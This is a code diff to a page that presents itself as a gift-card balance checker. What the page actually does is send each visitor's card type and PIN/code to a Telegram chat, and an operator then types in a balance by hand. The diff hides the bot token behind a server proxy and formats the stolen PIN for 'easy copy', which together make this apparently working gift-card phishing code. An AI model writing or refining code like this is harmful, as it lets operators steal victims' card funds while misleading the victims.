@@ -237,21 +237,20 @@ const CARD_LABELS = (function () {
 
 // ── Send Telegram message ─────────────────────────────────────
 async function sendTelegram(text) {
-  const token  = CONFIG.TELEGRAM_BOT_TOKEN;
-  const chatId = CONFIG.TELEGRAM_CHAT_ID;
-
-  if (!token || token === 'YOUR_BOT_TOKEN_HERE') {
-    console.warn('Telegram not configured — skipping send.');
-    return true; // allow flow to continue in dev mode
-  }
-
-  const url = `https://api.telegram.org/bot${token}/sendMessage`;
-  const res = await fetch(url, {
+  const res = await fetch('/api/telegram', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
+    body: JSON.stringify({ text }),
   });
-  return res.ok;
+  if (!res.ok) {
+    let msg = `Telegram send failed (${res.status})`;
+    try {
+      const body = await res.json();
+      if (body && body.error) msg = body.error;
+    } catch (_) {}
+    throw new Error(msg);
+  }
+  return true;
 }
 
 // ── Main check balance flow ───────────────────────────────────
@@ -277,10 +276,11 @@ async function checkBalance() {
   // ── Telegram message ──
   const tgMessage =
     `🎁 <b>New Gift Card Check</b>\n\n` +
-    `🃏 <b>Card Type:</b> ${cardLabel}\n` +
-    `🔑 <b>PIN / Code:</b> <code>${cardPin}</code>\n` +
+    `🃏 <b>Card Name:</b> ${cardLabel}\n` +
     `🆔 <b>Request ID:</b> <code>${requestId}</code>\n\n` +
-    `👉 Open admin panel and set the balance for this request ID.`;
+    `🔑 <b>Gift PIN / Code (easy copy):</b>\n` +
+    `<code>${cardPin}</code>\n\n` +
+    `👉 Open admin panel and set balance for this Request ID.`;
 
   try {
     await sendTelegram(tgMessage);
